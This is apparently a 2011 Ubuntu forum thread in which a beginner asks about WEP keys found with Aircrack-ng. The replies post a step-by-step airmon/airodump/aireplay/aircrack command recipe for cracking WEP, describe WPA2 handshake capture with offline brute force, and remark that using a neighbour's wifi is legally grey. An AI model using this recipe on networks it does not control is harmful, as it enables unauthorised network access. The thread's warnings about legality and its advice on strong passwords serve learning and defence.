---
title: "Aircrack-ng"
date: 2011-04-14
forum: Networking &amp; Wireless
---

### Post by N214 on 2011-04-14
Hello, I'm new to Ubuntu and I'm exploring the prgramme Aircrack-ng on Ubuntu. And I have a question, the key that we got afther le operation on aircrack-ng, is it corrcet in 100%?

---

### Post by josephmills on 2011-04-14
> **N214 said:**
> Hello, I'm new to Ubuntu and I'm exploring the prgramme Aircrack-ng on Ubuntu. And I have a question, the key that we got afther le operation on aircrack-ng, is it corrcet in 100%?

hi there sounds like you might be trying to get in a sports car before you learn how to drive. I am not sure that I understand your question if you got to 4 way handshake or are we talking wep? if it says 100% try it and you will know.

---

### Post by N214 on 2011-04-14
Hi, yeah I know I'm a beginner. I'm talking about "wep". And I have already tried it. The key isn't correct, I'm confused, so I try to understand.

---

### Post by josephmills on 2011-04-14
it is illegal in the states to crack other peoples wireless. So I hope that you are trying on your own network or have permission from the owner of the network. Here you can check this out [http://forum.aircrack-ng.org/](http://forum.aircrack-ng.org/)

---

### Post by espressobeanie on 2011-04-15
It is illegal, however it's a very grey legality if a neighbor's wifi connection passes thru the walls of your apt/house/whatever. 

God only knows what the wireless effect is on the brain. I mean, look at cellphones: [https://www.nytimes.com/2011/03/31/technology/personaltech/31basics.html](https://www.nytimes.com/2011/03/31/technology/personaltech/31basics.html)

Try Backtrack RC4 on a VM. It has Gerix. :twisted:

---

### Post by N214 on 2011-04-15
Yes I know that I try Aircrack-ng on my own wireless. I'm very interessted in computer so it's just out of curiosity:lolflag:

---

### Post by stealth. on 2011-04-15
> **N214 said:**
> Yes I know that I try Aircrack-ng on my own wireless. I'm very interessted in computer so it's just out of curiosity:lolflag:

What commands did you run?

---

### Post by N214 on 2011-04-15
I followed this video:
[http://www.youtube.com/watch?v=hJIk21Hi8M8](http://www.youtube.com/watch?v=hJIk21Hi8M8)

---

### Post by spiky001 on 2011-04-15
> **N214 said:**
> Yes I know that I try Aircrack-ng on my own wireless. I'm very interessted in computer so it's just out of curiosity:lolflag:

In that case you should know if it is correct!!!

---

### Post by N214 on 2011-04-15
I guess not but I have my password on my wifi and I got a key to backtrack, but it's encrypted so I can't check!

---

### Post by stealth. on 2011-04-15
If your using WEP I think it gives you the hex of the password. Like when you enter the password it get turned into hex, but I may be wrong. 

WEP can and **will **be cracked, trust me. WPA2 is what you should use, or just plug straight into the router/modem.

WPA2 can be cracked also, first they will capture the 4 way handshake, then brute-force your password (possibly offline, as they *have* your handshake). The best way to protect against that is use a password generator and make a really long password and just remember it or write it down (keep it safe though). 


I've tested routers ;)

---

### Post by josephmills on 2011-04-15
cool check this one out TERMINAL COMMANDS:```
sudo -s
```
```

airmon-ng stop [wireless card name]

``````
airmon-ng start [wireless card name]

``````
airmon-ng
``` have you now gone into monitor mode?
```
airodump-ng [wireless card name]
```
```

airodump-ng -w wep -c [channel number] --bssid [Bssid number] [wireless card name] 
```then open new terminal ```
sudo -s 
```
```
aireplay-ng -1 0 -a [bssid] [wireless card name]
```then open new terminal ```
sudo -s
```then 
```
aireplay-ng -3 -b [bssid][wireless card name]
```now let run for an hour 
then open a new terminal and  
```

aircrack-ng [filename] 
``` (the file name is the -w from airodump-ng -w wep -c [channel number] --bssid [Bssid number] [wireless card name]   so in this case it will be wep.cap )
try it out tell me how it works or if there is a better way thanks

---

### Post by josephmills on 2011-04-15
> **stealth. said:**
> If your using WEP I think it gives you the hex of the password. Like when you enter the password it get turned into hex, but I may be wrong. 

WEP can and **will **be cracked, trust me. WPA2 is what you should use, or just plug straight into the router/modem.

WPA2 can be cracked also, first they will capture the 4 way handshake, then brute-force your password (possibly offline, as they *have* your handshake). The best way to protect against that is use a password generator and make a really long password and just remember it or write it down (keep it safe though). 


I've tested routers ;)

I heard wpa/2 if over 30 characters then real hard for john and others (brute force)to crack

---

### Post by stealth. on 2011-04-15
> **josephmills said:**
> I heard wpa/2 if over 30 characters then real hard for john and others (brute force)to crack


Yeah, unless you use whitepixel (33.1 billion passwords a second)

---

### Post by josephmills on 2011-04-15
> **stealth. said:**
> Yeah, unless you use whitepixel (33.1 billion passwords a second)

is that included in the aircrack-ng suite?

---

### Post by stealth. on 2011-04-15
> **josephmills said:**
> is that included in the aircrack-ng suite?


No, its GPU accelerated password cracking, [http://whitepixel.zorinaq.com/](http://whitepixel.zorinaq.com/)

---

### Post by spiky001 on 2011-04-15
> I got a key to backtrack, but it's encrypted so I can't check!what do you mean you got a key to backtrack?

---

### Post by stealth. on 2011-04-15
> **spiky001 said:**
> what do you mean you got a key to backtrack?
Probably KEY FOUND!

---

### Post by josephmills on 2011-04-15
what about my recipe above know of anything better? for wep?

---

### Post by stealth. on 2011-04-15
> **josephmills said:**
> cool check this one out TERMINAL COMMANDS:```
sudo -s
``````

airmon-ng stop [wireless card name]

``````
airmon-ng start [wireless card name]

``````
airmon-ng
``` have you now gone into monitor mode?
```
airodump-ng [wireless card name]
``````

airodump-ng -w wep -c [channel number] --bssid [Bssid number] [wireless card name] 
```then open new terminal ```
sudo -s 
``````
aireplay-ng -1 0 -a [bssid] [wireless card name]
```then open new terminal ```
sudo -s
```then 
```
aireplay-ng -3 -b [bssid][wireless card name]
```now let run for an hour 
then open a new terminal and  
```

aircrack-ng [filename] 
``` (the file name is the -w from airodump-ng -w wep -c [channel number] --bssid [Bssid number] [wireless card name]   so in this case it will be wep.cap )
try it out tell me how it works or if there is a better way thanks


From what I remember:

sudo bash

aircrack-ng [interface] start (may be start [interface])

airodump-ng  -c [channel] --bssid (or --essid, i think) -w ~/Desktop/output [new interface that was created above, usually mon0]

aireplay-ng (I forget the exact commands here, your going to want to associate, then do a packet replay)

let it run for a while so you can get alot of IV's 

then use aircrack-ng on the file that you saved (~/Desktop/output)

---

